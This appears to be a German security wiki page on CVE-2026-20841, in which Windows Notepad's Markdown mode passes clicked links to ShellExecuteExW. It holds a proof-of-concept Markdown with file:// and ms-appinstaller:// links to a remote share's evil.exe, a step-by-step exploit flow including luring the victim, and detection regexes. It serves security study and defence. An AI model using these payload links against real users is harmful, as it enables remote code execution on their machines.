# Windows Protocol Handler / ShellExecute Abuse (Markdown-Renderer)

{{#include ../banners/hacktricks-training.md}}

Windows-Anwendungen, die Markdown oder HTML rendern, können angeklickte Ziele an `ShellExecuteExW` übergeben. Da ShellExecute registrierte URI-Schemata und Dateizuordnungen aufruft, benötigt ein Renderer eine explizite Allowlist, statt anzunehmen, dass jeder Link HTTP(S) verwendet. Das unten beschriebene Verhalten von Notepad betrifft CVE-2026-20841 und sollte nicht auf alle Renderer verallgemeinert werden.<sup>[[1]](#references)[[3]](#references)</sup>

## ShellExecuteExW-Angriffsfläche im Markdown-Modus von Windows Notepad
- Notepad wählt den Markdown-Modus **nur bei der Erweiterung `.md`** aus, und zwar über einen festen Zeichenkettenvergleich in `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Unterstützte Markdown-Links:
  - Standard: `[text](target)`
  - Autolink: `<target>` (wird als `[target](target)` gerendert), daher sind beide Syntaxformen für Payloads und Erkennungsregeln relevant.
- Klicks auf Links werden in `sub_140170F60()` verarbeitet. Dort erfolgt eine schwache Filterung, bevor `ShellExecuteExW` aufgerufen wird.
- `ShellExecuteExW` ruft **jeden konfigurierten Protocol Handler** auf, nicht nur HTTP(S).<sup>[[1]](#references)</sup>

### Überlegungen zu Payloads
- Alle `\\`-Sequenzen im Link werden vor dem Aufruf von `ShellExecuteExW` zu `\` **normalisiert**, was sich auf UNC-/Pfadgestaltung und Erkennung auswirkt.
- `.md`-Dateien sind **standardmäßig nicht Notepad zugeordnet**; das Opfer muss die Datei weiterhin in Notepad öffnen und auf den Link klicken. Nach dem Rendern ist der Link jedoch anklickbar.
- Gefährliche Beispielschema:<sup>[[1]](#references)</sup>
  - `file://` zum Starten einer lokalen/UNC-Payload.
  - `ms-appinstaller://` zum Auslösen von App-Installer-Abläufen. Auch andere lokal registrierte Schemata können missbraucht werden.

### Minimales PoC-Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Exploit-Ablauf
1. Erstellen Sie eine **`.md`-Datei**, damit Notepad sie als Markdown rendert.
2. Betten Sie einen Link mit einem gefährlichen URI-Schema ein (`file:`, `ms-appinstaller:` oder einem beliebigen installierten Handler).
3. Stellen Sie die Datei bereit (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB oder ähnlich) und überzeugen Sie den Benutzer, sie in Notepad zu öffnen.
4. Beim Klicken wird der **normalisierte Link** an `ShellExecuteExW` übergeben, und der entsprechende Protokoll-Handler führt den referenzierten Inhalt im Kontext des Benutzers aus.<sup>[[1]](#references)[[2]](#references)</sup>

## Erkennungsideen
- Überwachen Sie die Übertragung von `.md`-Dateien über Ports/Protokolle, über die häufig Dokumente bereitgestellt werden: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analysieren Sie Markdown-Links (Standardlinks und Autolinks) und suchen Sie nach `file:` oder `ms-appinstaller:` ohne Beachtung der Groß-/Kleinschreibung.
- Vom Hersteller empfohlene Regexes zur Erkennung des Zugriffs auf Remote-Ressourcen:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Die vom Anbieter in ZDI beschriebene Korrektur beschränkt zulässige Ziele auf lokale Dateien und HTTP(S). Erweitert die Erkennungsmechanismen bei Bedarf auf weitere installierte Protokollhandler, da die registrierte Angriffsfläche je nach System variiert.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Beliebige Codeausführung in Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
